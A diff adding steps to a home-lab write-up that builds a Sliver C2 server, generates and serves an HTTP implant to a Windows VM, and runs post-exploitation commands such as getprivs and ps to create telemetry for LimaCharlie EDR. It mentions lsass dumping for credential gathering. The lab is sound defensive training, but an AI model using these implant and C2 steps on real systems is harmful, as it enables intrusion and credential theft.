@@ -38,11 +38,39 @@ LimaCharlie EDR [possibly a link] is a SIaaS product with free and paid tiers is
 
 <img width="577" alt="Screenshot 2023-06-08 172520" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/d99b3d7b-d0b9-44be-b264-b42fbdbe4746">
 
-Next, we'll have to configure LimaCharlie to import the Sysmon Event Logs parallel to its native telemetry. This is done via the 'Artifact Collection' tab within LimaCharlie with a small amount of configuration. 
+Next, we'll have to configure LimaCharlie to import the Sysmon Event Logs parallel to its native telemetry. This is done via the 'Artifact Collection' tab within LimaCharlie with a small amount of configuration shown below 
 
 <img width="573" alt="Screenshot 2023-06-09 071924" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/d8372acb-12e1-4777-851e-261bc0478fc6">
 
-(Set up attack system)
+The last section of Part 1 is setup Sliver-Server on our Ubuntu machine. To do this, we'll SSH into the Ubuntu machine (using the static IP address configured earlier on) and drop into a root shell. Next, we'll download the Sliver Linux Server binary, make it executable and install mingw-w64 for some additional capabilities for our attacks later on. Finally, we'll create a working directory with the command mkdir -p /opt/sliver to use for future steps.
+
+## PART 2
+
+Firstly in Part 2, we're going to generate our C2 payload in Sliver. After launching Sliver-Server, we'll use the command generate --http [192.168.52.101] --save. This will save our implant in the working directory created in Part 1 with a randomly generated name as a .exe file. To confirm the new implant has been configured using the command implant. To confess, I had a problem the first time around with this step. I believe I generated my first implant outside of a root shell and therefore encountered issues with dumping the lsasss.exe process later on. Therefore, some of the screenshots will generate different names for the above .exe files (EXTREME_FILE.exe & EVOLUTIONARY_SOOT.exe). 
+
+<img width="256" alt="Screenshot 2023-06-12 162600" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/5da99195-a463-4525-8547-888ce20d9b80">
+
+For now, we're done with Sliver-Server so we'll exit the process. Now we need to download the C2 payload onto our Windows machine. Adversaries will find a multitude of different methods to deliver malware like phishing emails or unsuspecting malicious links for example, but for the lab, we'll simply run the command python3 -m http.server 80 to start a temporary web server. Next, we'll swap back into the Windows machine and download our C2 payload which is now staged and ready to exploit. This would now be a good time to snapshot the Windows machine. 
+
+Following the staging of our malware, we can head over to the SSH session of our Ubuntu machine, terminate the python web server and relaunch Sliver. In order to start the session on Sliver, you'll need to start the Sliver HTTP listener with the simple command of 'http', head back to the Windows machine, and execute the C2 payload from an administrative PowerShell. When you head back over to the Ubuntu SSH session this should appear in Sliver. You can verify the payload has been executed correctly by the command 'sessions' and seeing the green 'ALIVE' in the health tab. (see screenshot below)
+
+<img width="249" alt="Screenshot 2023-06-12 164015" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/71514afd-0f99-405a-b01c-d578fbd913c3">
+
+We will now look to interact with our C2 session by the command 'use [session id]' which is found previously in the 'sessions' command. This means we are interacting with the Windows machine via our C2 payload. We can verify this with basic commands like 'info' and 'whoami'. 'getprivs' will display the privileges available to us. Some of the privileges will interest us, particularly 'SeDebugPrivilege' which is enabled. Chen, R (2008) via Microsoft's website explains 'from a security perspective, SeDebugPrivilege is equivalent to administrator' making our future credential gathering much easier in the future. 
+
+<img width="496" alt="Screenshot 2023-06-12 164136" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/ba808f44-5072-497b-88cb-c7a986fe71a2">
+
+<img width="498" alt="Screenshot 2023-06-12 164208" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/2ce1cdc6-5979-4cff-9c4f-95aa358d7e7b">
+
+We'll continue to identify the characteristics of the Windows machine with more commands. 'pwd' will display the working directory and 'netstat' will allow us to investigate the network connections. 
+
+<img width="497" alt="Screenshot 2023-06-12 164245" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/7b873640-9d80-48a2-9cf0-b9870468426f">
+
+<img width="492" alt="Screenshot 2023-06-12 164335" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/5e8441f6-58e2-4ab4-826c-b639d4d25cca">
+
+Finally, we'll run 'ps -T' to highlight the running processes on our Windows machine. It should be noted (displayed in the screenshot below) that Sliver-Server will clearly highlight defensive processes in red (like Sysmon) alongside displaying the security products any attacker will need to be aware of or navigate around next to a yellow warning sign. It will also highlight its own native process i.e. our C2 implant in green. These actions should trigger some telemetry in LimaCharlie, so now we can head over to our EDR solution. 
+
+<img width="492" alt="Screenshot 2023-06-12 164431" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/dc5abab7-b8b4-48b4-abb4-2daa494f8079">
 
 
 
